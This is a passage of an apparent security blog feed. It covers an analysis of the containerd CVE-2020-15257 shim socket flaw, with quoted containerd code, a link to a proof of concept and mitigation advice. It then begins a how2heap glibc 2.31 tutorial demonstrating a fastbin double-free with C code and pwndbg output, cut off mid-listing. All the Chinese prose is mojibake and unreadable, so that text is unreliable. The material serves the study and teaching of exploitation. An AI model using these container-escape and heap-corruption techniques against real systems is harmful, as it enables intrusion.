the</span></span><br><span class="line"><span class="comment">// current credentials.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// This is useful when using abstract sockets that are accessible by all users.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">UnixSocketRequireSameUser</span><span class="params">()</span> <span class="title">UnixCredentialsFunc</span></span> &#123;</span><br><span class="line">euid, egid := os.Geteuid(), os.Getegid()</span><br><span class="line"><span class="keyword">return</span> UnixSocketRequireUidGid(euid, egid)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">requireRoot</span><span class="params">(ucred *unix.Ucred)</span> <span class="title">error</span></span> &#123;</span><br><span class="line"><span class="keyword">return</span> requireUidGid(ucred, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">requireUidGid</span><span class="params">(ucred *unix.Ucred, uid, gid <span class="keyword">int</span>)</span> <span class="title">error</span></span> &#123;</span><br><span class="line"><span class="keyword">if</span> (uid != <span class="number">-1</span> &amp;&amp; <span class="keyword">uint32</span>(uid) != ucred.Uid) || (gid != <span class="number">-1</span> &amp;&amp; <span class="keyword">uint32</span>(gid) != ucred.Gid) &#123;</span><br><span class="line"><span class="keyword">return</span> errors.Wrap(syscall.EPERM, <span class="string">&quot;ttrpc: invalid credentials&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">requireUnixSocket</span><span class="params">(conn net.Conn)</span> <span class="params">(*net.UnixConn, error)</span></span> &#123;</span><br><span class="line">uc, ok := conn.(*net.UnixConn)</span><br><span class="line"><span class="keyword">if</span> !ok &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, errors.New(<span class="string">&quot;a unix socket connection is required&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> uc, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>UnixSocketRequireSameUser </code> ä»…ä»…æ£€æŸ¥äº†è®¿é—®è¿›ç¨‹çš„ euid å’Œ egid ï¼Œè€Œåœ¨é»˜è®¤æƒ…å†µä¸‹å®¹å™¨å†…éƒ¨çš„è¿›ç¨‹éƒ½æ˜¯ä»¥ root ç”¨æˆ·å¯åŠ¨ï¼Œæ‰€ä»¥è¿™ä¸ªé™åˆ¶å¯ä»¥å¿½ç•¥ä¸è®¡ã€‚</p><h3 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h3><p>æ¼æ´åˆ©ç”¨éœ€è¦æ„å»º <strong>gRPC</strong> ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡æŸ¥é˜…ä»£ç ï¼Œ æŸ¥çœ‹ <strong>ontainerd</strong> é¡¹ç›®å‘¢å…³äº <strong>shim-client</strong> æ˜¯å¦‚ä½•ç¼–å†™çš„</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// WithConnect connects to an existing shim</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">WithConnect</span><span class="params">(address <span class="keyword">string</span>, onClose <span class="keyword">func</span>()</span>) <span class="title">Opt</span></span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="function"><span class="keyword">func</span><span class="params">(ctx context.Context, config shim.Config)</span> <span class="params">(shimapi.ShimService, io.Closer, error)</span></span> &#123;</span><br><span class="line">conn, err := connect(address, anonDialer)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, <span class="literal">nil</span>, err</span><br><span class="line">&#125;</span><br><span class="line">client := ttrpc.NewClient(conn, ttrpc.WithOnClose(onClose))</span><br><span class="line"><span class="keyword">return</span> shimapi.NewShimClient(client), conn, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é€šè¿‡ ttrpc æ„å»º clientï¼Œæ­¤æ—¶ conn ä¸º unix å¥—å­—èŠ‚</p><p>ç„¶åè¿”å› client</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">... ...</span><br><span class="line">c, clo, err :&#x3D; WithConnect(address, func() &#123;&#125;)(ctx, config)</span><br><span class="line">if err !&#x3D; nil &#123;</span><br><span class="line">return nil, nil, errors.Wrap(err, &quot;failed to connect&quot;)</span><br><span class="line">&#125;</span><br><span class="line">return c, clo, nil</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; ShimRemote is a ShimOpt for connecting and starting a remote shim</span><br><span class="line">func ShimRemote(c *Config, daemonAddress, cgroup string, exitHandler func()) ShimOpt &#123;</span><br><span class="line">return func(b *bundle, ns string, ropts *runctypes.RuncOptions) (shim.Config, client.Opt) &#123;</span><br><span class="line">config :&#x3D; b.shimConfig(ns, c, ropts)</span><br><span class="line">return config,</span><br><span class="line">client.WithStart(c.Shim, b.shimAddress(ns, daemonAddress), daemonAddress, cgroup, c.ShimDebug, exitHandler)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(r *Runtime)</span> <span class="title">Create</span><span class="params">(ctx context.Context, id <span class="keyword">string</span>, opts runtime.CreateOpts)</span> <span class="params">(_ runtime.Task, err error)</span></span> &#123;</span><br><span class="line">namespace, err := namespaces.NamespaceRequired(ctx)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> err := identifiers.Validate(id); err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, errors.Wrapf(err, <span class="string">&quot;invalid task id&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ropts, err := r.getRuncOptions(ctx, id)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">bundle, err := newBundle(id,</span><br><span class="line">filepath.Join(r.state, namespace),</span><br><span class="line">filepath.Join(r.root, namespace),</span><br><span class="line">opts.Spec.Value)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">defer</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">bundle.Delete()</span><br><span class="line">&#125;</span><br><span class="line">&#125;()</span><br><span class="line"></span><br><span class="line">shimopt := ShimLocal(r.config, r.events)</span><br><span class="line"><span class="keyword">if</span> !r.config.NoShim &#123;</span><br><span class="line"><span class="keyword">var</span> cgroup <span class="keyword">string</span></span><br><span class="line"><span class="keyword">if</span> opts.TaskOptions != <span class="literal">nil</span> &#123;</span><br><span class="line">v, err := typeurl.UnmarshalAny(opts.TaskOptions)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">&#125;</span><br><span class="line">cgroup = v.(*runctypes.CreateOptions).ShimCgroup</span><br><span class="line">&#125;</span><br><span class="line">exitHandler := <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">log.G(ctx).WithField(<span class="string">&quot;id&quot;</span>, id).Info(<span class="string">&quot;shim reaped&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> _, err := r.tasks.Get(ctx, id); err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="comment">// Task was never started or was already successfully deleted</span></span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> err = r.cleanupAfterDeadShim(context.Background(), bundle, namespace, id); err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.G(ctx).WithError(err).WithFields(logrus.Fields&#123;</span><br><span class="line"><span class="string">&quot;id&quot;</span>:        id,</span><br><span class="line"><span class="string">&quot;namespace&quot;</span>: namespace,</span><br><span class="line">&#125;).Warn(<span class="string">&quot;failed to clean up after killed shim&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">shimopt = ShimRemote(r.config, r.address, cgroup, exitHandler)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¾‹å¦‚è¿™æ ·çš„æ“ä½œ</p><p>æ›´å¤šçš„äº¤äº’æ“ä½œå¯ä»¥å‚è€ƒ å¼ ä¸€ç™½çš„ <a href="https://github.com/summershrimp/exploits-open/blob/9f2e0a28ffcf04ac81ce9113b2f8c451c36fe129/CVE-2020-15257/main.go">PoC</a></p><p>è‡³äºå…·ä½“çš„åˆ©ç”¨ï¼Œåœ¨è¿™é‡Œå°±ä¸è¿›è¡Œç»†èŠ‚æ¢è®¨äº†ï¼Œå¯ä»¥ç”±è¯»è€…è‡ªè¡Œå®Œæˆã€‚æœ€åæ”¾ä¸€ä¸ªæˆ‘çš„åˆ©ç”¨è§†é¢‘</p><iframe src="//player.bilibili.com/player.html?aid=800507748&bvid=BV1my4y1q7oe&cid=262892226&page=1&high_quality=1&danmaku=0"allowfullscreen="allowfullscreen" width="100%" height="500" scrolling="no" frameborder="0" sandbox="allow-top-navigation allow-same-origin allow-forms allow-scripts"></iframe<p>å¦å¤–æ¬¢è¿å¤§å®¶å…³æ³¨æˆ‘çš„æ¨ç‰¹ï¼š <a href="https://twitter.com/bestswngs/status/1334867563914915840">https://twitter.com/bestswngs/status/1334867563914915840</a></p><h3 id="å®‰å…¨å»ºè®®"><a href="#å®‰å…¨å»ºè®®" class="headerlink" title="å®‰å…¨å»ºè®®"></a>å®‰å…¨å»ºè®®</h3><ol><li><p>å‡çº§ containerd è‡³æœ€æ–°ç‰ˆæœ¬ã€‚</p></li><li><p>é€šè¿‡æ·»åŠ å¦‚ deny unix addr=@**çš„AppArmorç­–ç•¥ç¦æ­¢è®¿é—®æŠ½è±¡å¥—æ¥å­—ã€‚</p></li></ol><h3 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h3><p><a href="https://www.chainnews.com/articles/937146786717.htm">https://www.chainnews.com/articles/937146786717.htm</a><br><a href="https://github.com/containerd/containerd/security/advisories/GHSA-36xw-fx78-c5r4">https://github.com/containerd/containerd/security/advisories/GHSA-36xw-fx78-c5r4</a></p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css&quot; /&gt;&lt;div class=&quot;.article</summary>
      
    
    
    
    <category term="æ¼æ´åˆ†æ" scheme="https://bestwing.me/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
    
    <category term="CVE-2020-15257" scheme="https://bestwing.me/tags/CVE-2020-15257/"/>
    
  </entry>
  
  <entry>
    <title>Educational Heap Exploitation 2.0 (how2heap glibc 2.31)</title>
    <link href="https://bestwing.me/Education_Heap_Exploit_glibc_2.31.html"/>
    <id>https://bestwing.me/Education_Heap_Exploit_glibc_2.31.html</id>
    <published>2020-11-09T16:00:00.000Z</published>
    <updated>2020-11-12T09:07:12.000Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<h2 id="how2heap-glibc-2-31"><a href="#how2heap-glibc-2-31" class="headerlink" title="how2heap glibc 2.31"></a>how2heap glibc 2.31</h2><p>å‰å‡ å¤© how2heap æ›´æ–°äº†ï¼Œå°†ä¸»ä»“åº“åˆ’åˆ†æˆäº† 2.23 ã€2.27 ä»¥åŠ 2.31 ä¸‰ä¸ªåˆ†ç±»ï¼Œè¿™é‡Œæˆ‘ä»¬æ¥å¤ä¹ ï¼ˆå­¦ä¹ ï¼‰ ä¸€ä¸‹ glibc 2.31 ä¸‹çš„ä¸€äº› heap exploit</p><h3 id="1-fastbin-dup"><a href="#1-fastbin-dup" class="headerlink" title="1. fastbin_dup"></a>1. fastbin_dup</h3><p>å…³äº fastbin attack åœ¨glibc 2.31 ä¸Šæ²¡æœ‰ä»€ä¹ˆå˜åŒ–, è¿™é‡Œç»™çš„æ ·ä¾‹æ˜¯é€šè¿‡ double-attack æ¼æ´ä¿®æ”¹ æ„é€ ä¸¤ä¸ªæŒ‡é’ˆæŒ‡å‘åŒä¸€ä¸ª chunk çš„æƒ…æ™¯ã€‚</p><p>ç¨‹åºé¦–å…ˆ malloc äº† 8 æ¬¡, ç„¶å free äº†7æ¬¡ï¼ˆç”¨æ¥å¡«å…… tcache binsï¼‰</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> *ptrs[<span class="number">8</span>];</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="number">8</span>; i++) &#123;</span><br><span class="line">        ptrs[i] = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="number">7</span>; i++) &#123;</span><br><span class="line">        <span class="built_in">free</span>(ptrs[i]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ­¤æ—¶ tcachebins å·²ç»å¡«æ»¡</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bins</span><br><span class="line">tcachebins</span><br><span class="line"><span class="number">0x20</span> [  <span class="number">7</span>]: <span class="number">0x555555559360</span> â€”â–¸ <span class="number">0x555555559340</span> â€”â–¸ <span class="number">0x555555559320</span> â€”â–¸ <span class="number">0x555555559300</span> â€”â–¸ <span class="number">0x5555555592e0</span> â€”â–¸ <span class="number">0x5555555592c0</span> â€”â–¸ <span class="number">0x5555555592a0</span> â—‚â€” <span class="number">0x0</span></span><br><span class="line">fastbins</span><br><span class="line"><span class="number">0x20</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x30</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x40</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x50</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x60</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x70</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x80</span>: <span class="number">0x0</span></span><br><span class="line">unsortedbin</span><br><span class="line">all: <span class="number">0x0</span></span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><p>ç„¶åç”¨ calloc åˆ†é… 3 ä¸ªchunk ï¼Œ ä½¿ç”¨ calloc åˆ†é…çš„æ—¶å€™ï¼Œæ­¤æ—¶ä¸ä¼šä» tcachebins æ‹¿å·²ç» free çš„ chunk</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">  <span class="number">20</span> <span class="built_in">printf</span>(<span class="string">&quot;Allocating 3 buffers.\n&quot;</span>);</span><br><span class="line">  <span class="number">21</span> <span class="keyword">int</span> *a = <span class="built_in">calloc</span>(<span class="number">1</span>, <span class="number">8</span>);</span><br><span class="line">  <span class="number">22</span> <span class="keyword">int</span> *b = <span class="built_in">calloc</span>(<span class="number">1</span>, <span class="number">8</span>);</span><br><span class="line">â–º <span class="number">23</span> <span class="keyword">int</span> *c = <span class="built_in">calloc</span>(<span class="number">1</span>, <span class="number">8</span>);</span><br><span class="line">  <span class="number">24</span></span><br></pre></td></tr></table></figure><p>ç„¶åè¿›è¡Œ double free æ“ä½œå³ </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">free</span>(a);</span><br><span class="line"><span class="built_in">free</span>(b);</span><br><span class="line"><span class="built_in">free</span>(a);</span><br></pre></td></tr></table></figure><p>æ­¤æ—¶æˆ‘ä»¬æ³¨æ„åˆ°</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bins</span><br><span class="line">tcachebins</span><br><span class="line">0x20 [  7]: 0x555555559360 â€”â–¸ 0x555555559340 â€”â–¸ 0x555555559320 â€”â–¸ 0x555555559300 â€”â–¸ 0x5555555592e0 â€”â–¸ 0x5555555592c0 â€”â–¸ 0x5555555592a0 â—‚â€” 0x0</span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x555555559390 â€”â–¸ 0x5555555593b0 â—‚â€” 0x555555559390</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br></pre></td></tr></table></figure><p>æ­¤æ—¶å­˜åœ¨</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">         +----------------------------+</span><br><span class="line">         |                            |</span><br><span class="line">+--------+--------+          +--------+--------+</span><br><span class="line">|                 |          |                 |</span><br><span class="line">|      chunk a    |  +----&gt;  |      chunk b    |</span><br><span class="line">|                 |          |                 |</span><br><span class="line">+-----------------+          +-----------------+</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>chunk a æŒ‡å‘ chunk b ï¼ŒåŒæ—¶ chunk b ä¹ŸæŒ‡å‘äº† chunk a</p><p>ç„¶åå¦‚æœæˆ‘ä»¬å†æŠŠä»–ä»¬å å›æ¥ï¼Œ</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">In file: /media/psf/Home/Downloads/how2heap/glibc_2<span class="number">.31</span>/fastbin_dup.c</span><br><span class="line">   <span class="number">40</span></span><br><span class="line">   <span class="number">41</span> <span class="built_in">printf</span>(<span class="string">&quot;Now the free list has [ %p, %p, %p ]. If we malloc 3 times, we&#x27;ll get %p twice!\n&quot;</span>, a, b, a, a);</span><br><span class="line">   <span class="number">42</span> a = <span class="built_in">calloc</span>(<span class="number">1</span>, <span class="number">8</span>);</span><br><span class="line">   <span class="number">43</span> b = <span class="built_in">calloc</span>(<span class="number">1</span>, <span class="number">8</span>);</span><br><span class="line">   <span class="number">44</span> c = <span class="built_in">calloc</span>(<span class="number">1</span>, <span class="number">8</span>);</span><br><span class="line"> â–º <span class="number">45</span> <span class="built_in">printf</span>(<span class="string">&quot;1st calloc(1, 8): %p\n&quot;</span>, a);</span><br><span class="line">   <span class="number">46</span> <span class="built_in">printf</span>(<span class="string">&quot;2nd calloc(1, 8): %p\n&quot;</span>, b);</span><br><span class="line">   <span class="number">47</span> <span class="built_in">printf</span>(<span class="string">&quot;3rd calloc(1, 8): %p\n&quot;</span>, c);</span><br><span class="line">   <span class="number">48</span></span><br><span class="line">   <span class="number">49</span> assert(a == c);</span><br><span class="line">   <span class="number">50</span> &#125;</span><br><span class="line">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ STACK ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>â”‚ rsp  <span class="number">0x7fffffffe230</span> â—‚â€” <span class="number">0x700000008</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>â”‚      <span class="number">0x7fffffffe238</span> â€”â–¸ <span class="number">0x5555555593a0</span> â—‚â€” <span class="number">0x0</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>â”‚      <span class="number">0x7fffffffe240</span> â€”â–¸ <span class="number">0x5555555593c0</span> â—‚â€” <span class="number">0x0</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>â”‚      <span class="number">0x7fffffffe248</span> â€”â–¸ <span class="number">0x5555555593a0</span> â—‚â€” <span class="number">0x0</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>â”‚      <span class="number">0x7fffffffe250</span> â€”â–¸ <span class="number">0x5555555592a0</span> â—‚â€” <span class="number">0x0</span></span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>â”‚      <span class="number">0x7fffffffe258</span> â€”â–¸ <span class="number">0x5555555592c0</span> â€”â–¸ <span class="number">0x5555555592a0</span> â—‚â€” <span class="number">0x0</span></span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>â”‚      <span class="number">0x7fffffffe260</span> â€”â–¸ <span class="number">0x5555555592e0</span> â€”â–¸ <span class="number">0x5555555592c0</span> â€”â–¸ <span class="number">0x5555555592a0</span> â—‚â€” <span class="number">0x0</span></span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>â”‚      <span class="number">0x7fffffffe268</span> â€”â–¸ <span class="number">0x555555559300</span> â€”â–¸ <span class="number">0x5555555592e0</span> â€”â–¸ <span class="number">0x5555555592c0</span> â€”â–¸ <span class="number">0x5555555592a0</span> â—‚â€” ...</span><br><span class="line">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ BACKTRACE ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</span><br><span class="line"> â–º f <span class="number">0</span>     <span class="number">555555555428</span> main+<span class="number">511</span></span><br><span class="line">   f <span class="number">1</span>     <span class="number">7f</span>fff7dec0b3 __libc_start_main+<span class="number">243</span></span><br><span class="line">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</span><br><span class="line">pwndbg&gt; p a</span><br><span class="line">$<span class="number">16</span> = (<span class="keyword">int</span> *) <span class="number">0x5555555593a0</span></span><br><span class="line">pwndbg&gt; p b</span><br><span class="line">$<span class="number">17</span> = (<span class="keyword">int</span> *) <span class="number">0x5555555593c0</span></span><br><span class="line">pwndbg&gt; p c</span><br><span class="line">$<span class="number">18</span> = (<span class="keyword">int</span> *) <span class="number">0x5555555593a0</span></span><br></pre></td></tr></table></figure><p>å°±ä¼šå­˜åœ¨ä¸¤ä¸ªæŒ‡é’ˆæŒ‡å‘åŒä¸€å— chunkï¼Œé€šå¸¸è€Œè¨€æˆ‘ä»¬çš„ä¸‹ä¸€æ­¥åˆ©ç”¨ä¼šæ‰¾ä¸€ä¸ª size ç¬¦åˆå½“å‰fastbin é“¾çš„åœ°å€ï¼ˆ_int_malloc ä¼šå¯¹æ¬²åˆ†é…ä½ç½®çš„ size åŸŸè¿›è¡ŒéªŒè¯ï¼Œå¦‚æœå…¶ size ä¸å½“å‰ fastbin é“¾è¡¨åº”æœ‰ size ä¸ç¬¦å°±ä¼šæŠ›å‡ºå¼‚å¸¸ã€‚ï¼‰ï¼Œç„¶ååœ¨åˆ†é…å‡º chunk a çš„åŒæ—¶ä¿®æ”¹ chunk a çš„ fd</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span 